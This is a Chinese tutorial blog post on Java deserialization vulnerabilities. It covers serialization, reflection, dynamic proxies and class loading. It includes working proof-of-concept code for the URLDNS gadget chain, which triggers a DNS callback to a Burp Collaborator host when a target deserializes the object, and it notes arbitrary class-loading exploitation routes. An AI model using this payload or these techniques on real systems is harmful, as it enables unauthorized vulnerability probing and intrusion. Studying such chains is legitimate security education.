---
layout: post
title: JAVA反序列化
tag: 基础知识
---

[running9911](https://www.freebuf.com/author/running9911)2025-12-01 21:25:2417166

 所属地 山西省

本文由running9911创作，仅为转载

## 概述

**Java序列化**是指把Java对象转换为字节序列的过程（将对象在内存中的状态（字段的值等）转化为序列）

**Java反序列化**是指把字节序列恢复为Java对象的过程。

这样做可以将属性存放到数据库中

**这么做原因**：要在两台机器之间通过这些序列**传输**对象

**常见的序列化和反序列化协议**：

- XML&SOAP
- JSON（Javascript Object Notation）
- Protobuf

**序列化是针对对象的**

## 实现

**序列化：**

```
public class SerializationTest {
public static void serialize(Object obj) throws IOException {
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
oos.writeObject(obj);
}
}
```

写一个类，将内容存入文件，调用writeObject方法将其序列化

**反序列化**：

```
public class UnserializeTest {
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
ObjectInputStream ois= new ObjectInputStream(new FileInputStream(Filename));
Object obj = ois.readObject();
return obj;
}
}
```

将序列化内容存入文件，readObject读取实现反序列化

注意：

```
public class Person implements Serializable{
}
```

**读取接口**`Serializable`才可以序列化

## 输入输出流

### 注意点

- ObjectOutputStream代表对象输出流：

  它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。

- ObjectInputStream代表对象输入流：

  它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。

- 一个实现 Serializable 接口的子类也是可以被序列化的。

- 静态成员变量是不能被序列化，**序列化是针对对象属性的**，而静态成员变量是属于类的。

- transient 标识的对象成员变量不参与序列化

  ![image-20251111200638153](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251111200645256.png)

  此处name的变量被transient标记

- idea原生可以自己写readObject()和writeObject()

  比如在建立一个数组下限是100，但是实际使用了30，而全部序列化产生了浪费

  所以可以自己写方法，调用时，**优先调用自己写的方法**

- serialVersionUID， 用于验证版本一致性

  发生改变有三种情况：

  1. 手动去修改导致当前的 serialVersionUID 与序列化前的不一样。
  2. 我们根本就没有手动去写这个 serialVersionUID 常量，那么 JVM 内部会根据类结构去计算得到这个 serialVersionUID 值，在类结构发生改变时(属性增加，删除或者类型修改了)这种也是会导致 serialVersionUID 发生变化。
  3. 假如类结构没有发生改变，并且没有定义 serialVersionUID ，但是反序列和序列化操作的虚拟机不一样也可能导致计算出来的 serialVersionUID 不一样。

### 漏洞危害

**为什么会产生安全问题?：**

只要服务端反序列化数据，客户端传递类的readObject中代码会**自动执行**，给予攻击者在服务器上运行代码的能力。

**可能的形式**：

1. 入口类的readObject直接调用危险方法。

   自己写的readObject，直接加**命令执行**的危害代码

2. 入口类参数中包含可控类，该类有危险方法，readObject时调用。**（类套类）**

   - 共同条件 继承Serializable

     - 入口类 source (重写readObject 参数类型宽泛 最好jdk自带)--------->mapper HashMapper

       接口重写readObject原因：不同主机jvm，所写出来的哈希值不同，需要拆解对象，单独计算元素，需要重新指向readObject

     - 调用链 gadget chain （相同名称 相同类型）

     - 执行类 sink (rce ssrf 写文件等等）

3. 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用。

## 反射

### 引出

按照上面的HashMapper进行测试

- 先写HashMapper传入<url , integer>,传入url会继承Serializable 接口（所以可能存在反序列化触发点）

  ```
  public static void main(String[] args) throws Exception {
  Person person = new Person("aa", 22);
  HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
  hashmap.put(new URL("http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net"), 1);
  // System.out.println(person);
  serialize(hashmap);
  }
  ```

  测试发现可以序列化（服务端出现请求），但是反序列化没有输出

  `不序列化也可以出现请求`

- **原因：**

  在HashMapper初始化的时候，将hashcode=-1

  ![image-20251111220051455](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251111220051499.png)

  但是存在判断

  ![image-20251111220112576](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251111220112620.png)

  也就是说，初始化的时候是-1，但是在put之后，hashcode发生改变，从而实现序列化反序列化

- 修复；

  在初始化的时候不要发起请求

  put之后，将hashcode变回-1；

  所以就用到了**反射**

### 入门

#### 解释

反射对应正射

- 正射

  就是正常的java代码流程（已知初始化类，new对象，操作对象）

- 反射

  未知初始化类，所以new不了

#### 作用

- 反射的作用:让iava具有动态性

  由于java是强类型语言，写啥就是啥（String name）

  而php里面输入啥运行啥（eval< >）

  **利用反射就可以实现动态化**

- 修改已有对象的属性

- 动态生成对象

- 动态调用方法操作内部类和私有方法

**在反序列化漏洞的作用：**

- 定制需要的对象
- 通过invoke调用除了同名函数以外的函数（以字符串接收方法，可以使用拼接实现绕过）
- 通过Class类创建对象，引入不能序列化的类

#### 实现

Person类：

```
// 假设存在Person类
class Person {
public String name;
private int age;

public Person() {}

public Person(String name, int age) {
this.name = name;
this.age = age;
}

@Override
public String toString() {
return "Person{name='" + name + "', age=" + age + '}';
}
}
```

实现：（就是利用class方法，从原型class里面实例化对象）

##### **从原型class里面实例化对象**

c.newInstance();

```
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ReflectionTest {
public static void main(String[] args) throws Exception {
Person person = new Person();
Class c = person.getClass();
//反射就是操作Class

//从原型class里面实例化对象
//c.newInstance();
Constructor personconstructor = c.getConstructor(String.class, int.class);
Person p = (Person) personconstructor.newInstance("abc", 22);
System.out.println(p);
}
}

```

解析：

- 利用class接收内容（进到class发现这个方法接收的参数是class类型 ，所以要写成String.class）
- 对于想要反射的对象`person`，写入参数`abc,22`（分别对应string int ）

输出：

![image-20251112195345895](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112195352992.png)

##### **获取类里面属性**

1. c.getFields()（是class的一个getFields()方法，返回一个`Field`数组）‘

   **注意：**getFields()，返回的数组是每个`Field`对象对应类中的一个**公共字段**（被`public`修饰的字段） **c.getDeclaredFields()**可以返回private

   ```
   //获取类里面属性
   Field[] personfields = c.getFields();
   for(Field f:personfields){
   System.out.println(f);
   }
   ```

   解析：

   - 利用的是Field
   - 先建立一个名称为`personfields`的Field数组
   - 遍历数组到 f （ f 是**临时存储当前遍历到的数组元素**的变量）
   - 输出f

   输出：

   ![image-20251112200428428](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251112200428456.png)

   但是，此处的int类型的age没有打印出来 **原因：**

   ```
   public String name;
   private int age;
   ```

   name是public，age是private

2. **但是使用`c.getDeclaredFields()`即可打印**

   ![image-20251112200939655](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112200939690.png)

3. 只传特定值（改变值）

   ```
   Field namefield = c.getField("name");
   namefield.set(p,"saffs");
   System.out.println(p);
   ```

   把上面的p（先前使用c.newInstance()的输出）的name属性改为`saffs`

   输出：

   ![image-20251112220911332](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112220911373.png)

   **getField也是私有的`private`不能修改**

   **c.getDeclaredFields() namefield.setAccessible(true);即可**

   ```
   Field namefield = c.getDeclaredField("age");
   namefield.setAccessible(true);
   namefield.set(p,25);
   System.out.println(p);
   ```

   改成这样就有权限了

##### **调用类里面的方法**

1. 使用`c.getMethods();`

   ```
   Method[] personmethods = c.getMethods();
   for(Method m: personmethods){
   System.out.println(m);
   }
   ```

   输出：（输出所有方法）

   ![image-20251113144532381](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113144539462.png)

2. 单个方法

   `invoke（）`某个对象的某个方法

   ```
   Method actionmethod = c.getMethod("action", String.class);
   actionmethod.invoke(p, "dasqjfasqh");
   ```

   c.getMethod后面接收（方法名，class确切查询的类型）

   invoke（传对象，传参数）

   ![image-20251113144858506](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113144858535.png)

3. 调用私有（同上加一个setAccessible(true）即可）

   ```
   Method actionmethod = c.getDeclaredMethod("action", String.class);
   actionmethod.setAccessible(true);
   actionmethod.invoke(p, "dasqjfasqh");
   ```

## URLDNS 链

接上文的引出以及反射（URLDNS 链为例子）

```
public static void main(String[] args) throws Exception {
Person person = new Person("aa", 22);
HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
hashmap.put(new URL("http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net"), 1);
// System.out.println(person);
serialize(hashmap);
}
```

`java.net.URL`的`hashCode()`方法中，会触发 **DNS 请求**到该 URL 的主机名（host）

现在的目的就是**利用**这条链

### 分析

- 目标是调用url类的hashcode类的方法

  跟进到url

  找到hashcode方法

  ![image-20251113170516163](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113170516197.png)

- 在put的时候（跟进看看）

  ```
  public V put(K key, V value) {
  return putVal(hash(key), key, value, false, true);
  }
  ```

  put调用hash（跟进hash）

- ![image-20251113170826406](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113170848928.png)

  发现hash调用了hashcode

  **所以put会发起请求**

  也就是说，是-1（初始化）就会发起请求

  `发起请求的作用：`

  `发起请求是 攻击者想要的副作用，不是防护措施。相反它被用作 证据 或 辅助手段 来利用漏洞`

- 也就是到了url里面的hashcode判断

  ![image-20251113203025497](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113203025577.png)

- 跟进hashCode

  ![image-20251113203100761](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251113203100806.png)

  `getHostAddress(u)`会尝试把 URL 中的主机名解析成一个`InetAddress`对象（也就是 IP 地址）， 如果主机名解析成功（`addr`不为 null），就把解析出来的 IP 地址的`hashCode()`加入到`h`（整个 URL 的哈希值）里 ； 如果 DNS 没解析成功（`addr == null`），那就直接取 URL 原始的`host`字符串

- 跟进`getHostAddress`

  ![image-20251113203345092](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251113203345131.png)

  - 如果`host`是 IP 地址，直接转换成`InetAddress`，不会走 DNS
  - 如果`host`是域名，这里就会向系统的 **DNS 解析器**发起请求，解析成 IP

### 利用

攻击者希望 **在构造 / 传输阶段不触发外联**（避免被检测或提前暴露），但希望 **在受害者反序列化时触发外联**（证明漏洞或泄露信息）。因此：**在构造时先把`hashCode`计算并缓存（≠ -1），再用反射把它改回 -1；序列化时不会触发；反序列化时会触发**。

```
public static void main(String[] args) throws Exception {
Person person = new Person("aa", 22);
HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
//不要在此处发起请求
hashmap.put(new URL("http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net"), 1);
//通过这里将hashcode改为-1（利用反射）
serialize(hashmap);
}
```

修改：

```
public static void main(String[] args) throws Exception {
//    Person person = new Person("aa",22);
HashMap<URL, Integer> hashmap= new HashMap<>();

//这里不要发起请求,把url对象的hashcode改成不是-1
URL url = new URL("http://dta2x89uikgnnjtbztk9yexyepkh86.burpcollaborator.net");
Class c = url.getClass();
Field hashcodefield = c.getDeclaredField("hashCode");
hashcodefield.setAccessible(true);
hashcodefield.set(url,1234);
hashmap.put(url,1);

//这里把hashcode改回-1
//通过反射 改变已有对象的属性
hashcodefield.set(url,-1);
serialize(hashmap);
}
```

没改之前，在序列化 就会受收到DNS请求（相当于是在本地发起请求，自己接收自己，不知道使用者能不能反馈）

```
（序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求）
```

修改之后，序列化无请求，反序列化有请求（接受用户会显示dns）

### 核心

- new一个对象，对象里面放url

- 将这个对象放在hashmap里面

- 进行序列化

- 最终通过反序列的dns请求，触发对 URL 中主机的 DNS 查询或网络请求

  通过外部可观测的 DNS/HTTP 回连（OOB）来确认漏洞或窃取少量信息

### 流程

HashMap.readObject()

-> HashMap.putVal()

-> HashMap.hash()

-> URL.hashCode()

-> URLStreamHandler.hashCode()

-> URLStreamHandler.hashCode.getHostAddress()

-> getHostAddress.InetAddress.getByName()`这里发出 DNS 请求`

1. 入口A HashMap 接受参数O
2. 目标类B URL
3. 目标调用B.f
4. A.readObject -> O.f -> 将B传入替换O-> 即调用B.f

## JDK动态代理

### 代理

类里面的类

eg：房东只有房；中介即收中介费，还管理后期的维修问题（不能把所有东西都堆给房东）

### 静态代理

包含三个角色：

接口类（抽象角色）：定义共同的方法（比如`IUser`）

目标类（真实角色）：实现接口中的方法（比如`UserImpl`）

代理类（代理角色）：也实现接口，但在调用目标类方法前后加上“增强逻辑”（比如`UserProxy`）

#### 示例

接口类：

```
package com.test;

public interface  IUser {
public void show();
public void creat();
public void update();
}

```

真实类：

```
package com.test;

public class UserImpl implements IUser {
@Override
public void show() {
System.out.println("展示");
}

@Override
public void creat() {
System.out.println("creat");
}

@Override
public void update() {
System.out.println("update");
}
}
```

代理类：

```
package com.test;

public class UserProxy implements IUser  {
IUser user;

public UserProxy(IUser user) {
this.user = user;
}

@Override
public void show() {
user.show();
System.out.println("调用了show");
}

@Override
public void creat() {
user.creat();
System.out.println("调用了Creat");
}

@Override
public void update() {
user.update();
System.out.println("调用了Update");
}
}

```

执行：

```
package com.test;

import java.lang.reflect.Proxy;

public class ProxyTest {
public static void main(String[] args) {
//直接连接调用
IUser user = new UserImpl();//接口类引用指向实现类对象
//  user.show();


//静态代理
IUser userProxy = new UserProxy(user);//传进真正的对象
userProxy.show();
userProxy.creat();
}
}

```

### 动态代理

- 示例

  ```
  //动态代理
  //要代理的接口、要做的事情、classloader
  InvocationHandler userinvocationhandler = new UserInvocationHandler(user);
  IUser userProxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),
  user.getClass().getInterfaces(),
  userinvocationhandler);
  userProxy.update();
  }
  ```

  1. Proxy.newProxyInstance（）就是要新建一个动态代理类

  2. 查看传参

     代理接口、要传入的东西、类加载器`classloader`

     ![image-20251114202828469](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251114202828512.png)

     第一个是classloader，第二个是类的接口，第三个是调用处理器（传入的东西）

     前两个是系统固定给的参数，只有InvocationHandler类得自己写

     

- InvocationHandler类：

  ```
  public class UserInvocationHandler implements InvocationHandler {
  
  }
  ```

  ![image-20251114203424363](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251114203424403.png)

  爆红原因：

  ![image-20251114203452235](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251114203452269.png)

  需要重写invoke

  因为：

  1. JDK 动态代理的所有方法调用，本质上全部都被转发到`InvocationHandler.invoke()`
  2. 如果你不重写`invoke()`，代理对象调用方法时：
     - 没有任何逻辑可执行
     - 也无法调用真实对象
     - 相当于“没有代理”
  3. InvocationHandler是接口，不是父类，所以接口里面的方法需要实现，也就是通过invoke来实现

  

  重写之后：

  最重要的就是`method`

  ![image-20251114204034899](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251114204034935.png)

  不管外界传入什么，都要通过invoke来调用method方法

  代码：

  ```
  public class UserInvocationHandler implements InvocationHandler {
  
  IUser user;
  
  public UserInvocationHandler() {
  }
  
  public UserInvocationHandler(IUser user) {
  this.user = user;
  }
  
  @Override
  public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
  System.out.println("调用了"+method.getName());
  method.invoke(user, args);
  return null;
  }
  }
  ```

  通过动态调用，来将`真实文件`中的接口实现调用

  不用写上面那么多的静态代码（`UserProxy`），节约了代码

- 流程：

  B.f（最终目的）

  A[O] ->O .abc

  O[O2]invoke->O2.f（使用B.f替换O2）----------->O[B]invoke->B.f

  所以A[O] ------->O .abc --------->B.f

- 总结 代理 一种设计模式不修改原有类 增加功能

  **意义:**少修改代码 适配强

  在反序列化漏洞中的**作用**： readObject>反序列化自动执行invoke>有函数调用 拼接两条链（任意->固定）

### 对比

|     类型     |         本质         |   代码谁来写？   |      可代理方法数量      |          是否需要接口          |
| :----------: | :------------------: | :--------------: | :----------------------: | :----------------------------: |
| **静态代理** |   提前写死的代理类   |  **你写代理类**  |  固定（写几个代理几个）  |         要求接口或继承         |
| **动态代理** | JVM 运行时生成代理类 | **JVM 自动生成** | 无限制，自动代理全部方法 | JDK 要有接口（CGLIB 可无接口） |

## JAVA类加载机制

### 流程

![image-20251116155501990](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251116155502056.png)



也就是说在使用的时候会执行一些代码

（反序列化就是readobject代码自动加载）

### 类加载器

#### 介绍

赋予了 Java 类可以被动态加载到 JVM 中并执行的能力

- 类加载器是一个负责加载类的对象，用于实现类加载过程中的加载这一步
- 每个 Java 类都有一个引用指向加载它的`ClassLoader`
- 数组类不是通过`ClassLoader`创建的（数组类没有对应的二进制字节流），是由 JVM 直接生成的

```
class Class<T> {
...
private final ClassLoader classLoader;
@CallerSensitive
public ClassLoader getClassLoader() {
//...
}
...
}
```

**主要作用就是动态加载 Java 类的字节码（`.class`文件）到 JVM 中（在内存中生成一个代表该类的`Class`对象）。**

### 加载规则

JVM 启动的时候，并不会一次性加载所有的类，而是根据需要去**动态加载**（调用才加载）

对于已经加载的类会被放在`ClassLoader`中。在类加载的时候，系统会首先判断当前类是否被加载过。已经被加载的类会直接返回，否则才会尝试加载。也就是说，对于一个类加载器来说，相同二进制名称的类只会被加载一次

```
public abstract class ClassLoader {
...
private final ClassLoader parent;
// 由这个类加载器加载的类。
private final Vector<Class<?>> classes = new Vector<>();
// 由VM调用，用此类加载器记录每个已加载类。
void addClass(Class<?> c) {
classes.addElement(c);
}
...
}
```



### 代码块

#### 静态代码块

`static {}`，类第一次加载到 JVM 时执行一次。只执行一次！



**用途：**

- 初始化类的静态资源（静态变量）
- 只需要执行一次的准备动作（如加载配置文件、注册驱动等）

**特点：**

- **只执行一次**
- **最早执行**（甚至早于 main）

```
public class Demo {
static {
System.out.println("静态代码块：类加载时执行一次");
}
}
```

#### 构造代码块（实例代码块）

`{ }`，每创建一个对象时执行一次，而且执行顺序在构造方法之前。

**用途：**

- 多个构造方法间共享代码（避免重复）

```
public class Demo {
{
System.out.println("构造代码块：每次 new 对象时都会执行");
}

public Demo(){
System.out.println("构造函数：最后执行");
}
}
```

#### 构造函数（构造方法）

每创建一个对象时执行一次，在构造代码块之后。

**用途：**

- 初始化对象的成员变量
- 创建对象时执行特定逻辑

```
public Demo() {
System.out.println("构造方法执行！");
}
```

**对比**

|           名称           | 触发条件 |    执行次数     |        目的        |
| :----------------------: | :------: | :-------------: | :----------------: |
| **静态代码块 static {}** | 类加载时 |      一次       |   初始化静态资源   |
|    **构造代码块 {}**     | 创建对象 | 每次 new 都执行 | 构造方法前统一代码 |
|       **构造方法**       | 创建对象 | 每次 new 都执行 |   初始化对象属性   |

#### Class.forName()

- 用来 手动加载类 的方法

  `Class.forName()`会触发：类加载 + 类初始化（执行静态代码块）

- 跟进查看原因：

  - ![image-20251115221659426](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251115221659584.png)

    在forName调用的是`forName0`方法

  - 看forName0`方法

    ![image-20251115221822053](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251115221822096.png)

    native意思是c/c++写的

    传参：类名，判断`（是否初始化）`，类加载器，其他`（这个参数传递的都是null，不用写）`

  - ![image-20251115222737321](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251115222737358.png)

    forname的重写，判断有没有初始化

- 查看默认

  ![image-20251115223127503](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251115223127547.png)

  默认是true，也就是说默认是初始化的

  **所以：**

  ```
  ClassLoader cl =ClassLoader.getPlatformClassLoader();
  Class.forName("com.example.demo.Person");
  ```

  手动修改，不会默认进行初始化

  

  ```
  ClassLoader cl =ClassLoader.getPlatformClassLoader();
  Class.forName("com.example.demo.Person");
  c.newInstance
  ```

  即可初始化

  `c.newInstance`用于创建一个类的实例，相当于调用它的 **无参构造方法**。

### 研究底层

#### 双亲委派

[https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B](https://javaguide.cn/java/jvm/classloader.html#双亲委派模型)

用于确定使用哪个加载类的

![image-20251116154159173](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251116154206283.png)

不是继承关系，是逻辑上的流程指向

而且这三个就加载器，所**加载的路径**不同

- **Bootstrap ClassLoader（启动类加载器）**：加载`$JAVA_HOME/jre/lib`目录下的核心类库（如`rt.jar`、`resources.jar`等），也可通过`-Xbootclasspath`参数指定路径。
- **Extension ClassLoader（扩展类加载器）**：加载`$JAVA_HOME/jre/lib/ext`目录下的类，或通过系统属性`java.ext.dirs`指定的路径。
- **Application ClassLoader（应用程序类加载器）**：加载`classpath`路径下的类，包括项目的`src/main/classes`、`lib`目录下的 jar 包，或通过`-cp`/`-classpath`参数指定的路径。



#### `ClasshLoader`

- loadclass不进行初始化

- 跟进去看看

  ![image-20251118093549650](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251118093556750.png)

  先调用一个参数到loadclass，返回了两个参数的loadclass

- 跟进loadclass（ ---- , -----）

  ![image-20251118094001550](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118094001608.png)

- 到findclass（）

  ![image-20251118094440081](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118094440116.png)

  

  是相当于两者都是继承了urlclassload（其他两个没到找到findclass，所以就直接去了父类）

  ![image-20251118203448005](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251118203448096.png)

  而且目前已经生成了path（对于person）

  从路径中寻找，找到了之后调用了**defineclass类**

- 步入defineclass

  ![image-20251118205224297](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118205224614.png)

  用于安全判断

  但是后面的返回值还调用了一个defineclass()

  ![image-20251118205327222](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251118205327373.png)

- 到SecureClassLoader.java（是urlclassload的父类）

  ![image-20251118205631243](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251118205631283.png)

- 接下来

  ![image-20251118221037684](E:\祈染安的博客\qiranan.github.io\assets\images\CTF\20251118221037736.png)

  调用了defindclass1

  ![image-20251118221126615](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118221126667.png)

- ![image-20251118221522174](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251118221522210.png)

  通过传入类名，以及编译之后的字节码，利用字节码直接将类搞出来

**流程：**

继承：ClassLoader->SecureClassLoader->URLClassLoader->AppClassLoader

执行：loadClass->findClass(重写的方法)->defineClass(从字节码加载类)

**问题：**

test里面，静态写入获取计算器的命令执行代码：执行完成之后，删除test类，在主类里用urlclassloader.loadclass(Test)，为什么还会弹出计算器？？？

因为：只要类已经被加载到 JVM 中，其静态代码块就会执行，且不会因后续文件删除而撤销执行结果。

**总结：**

1. 类加载与反序列化类加载的时候会执行代码 初始化:静态代码块 实例化:构造代码块、无参构造函数

2. 动态类加载方法 Class.forname 初始化/不初始化 ClassLoader.loadClass不进行初始化 底层的原理，实现加载任意的类

3. 漏洞利用

   URLClassLoader任意类加载:file/http/jar

   ClassLoader.defineClass 字节码加载任意类 私有

   Unsafe.defineClass 字节码加载 public 类不能直接生成 Spring 里面可以直接生成